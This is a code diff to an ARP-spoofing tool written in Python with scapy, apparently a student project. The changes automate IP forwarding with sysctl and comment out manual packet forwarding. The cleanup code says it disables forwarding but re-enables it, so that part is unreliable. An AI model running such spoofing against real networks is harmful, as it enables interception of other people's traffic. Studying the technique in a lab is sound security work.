@@ -4,6 +4,7 @@ ARPSpoof Program by Clayton Johnson and Mitchell Bohn
 
 Steps:
 	Take IPs and find their MAC Addresses through ARP Request
+We need to run this automatically: sysctl -w net.ipv4.ip_forward=1
 
 '''
 import argparse
@@ -11,6 +12,7 @@ from scapy.all import Ether, ARP, sr, send, sniff
 from time import sleep
 import threading
 import sys
+import subprocess
 
 def get_mac_address(ip):
 	#Make ARP Request to get MAC addy for given ip
@@ -76,6 +78,8 @@ def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac, poison_thread):
 					print('\tDestination: {}'.format(pkt.dst))
 					print('\tSource : {}'.format(pkt.src))
 					
+					'''
+					#This stuff is helpful if we also want to eventually spoof the IP, but the code works as it is...
 					if pkt.src == t_mac:
 						#Forward pkt to h_mac from me
 						pkt.src = pkt.dst
@@ -90,15 +94,22 @@ def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac, poison_thread):
 					print('\tDatatype of pkt: {}'.format(type(pkt)))
 					print('\tDestination: {}'.format(pkt.dst))
 					print('\tSource : {}'.format(pkt.src))
-					send(pkt, verbose=0)
+
+					#Send the packet to it's original destination
+					send(pkt, iface="eth1", verbose=0)'''
 				
-				#Send the packet to it's original destination
 				
 		except KeyboardInterrupt: 
 			print('Sniffing ceased...')
+
+			#Automatically disable port forwarding
+			subprocess.check_output(['sysctl','-w','net.ipv4.ip_forward=1'])
 			sys.exit(0)
 
 def spoof_time(t_ip, h_ip):
+	#Automatically enable port forwarding
+	subprocess.check_output(['sysctl','-w','net.ipv4.ip_forward=1'])
+	
 	#print(f'Target IP: {t_ip}')
 	print('Target IP: {}'.format(t_ip))
 	#print(f'Host IP: {h_ip}')
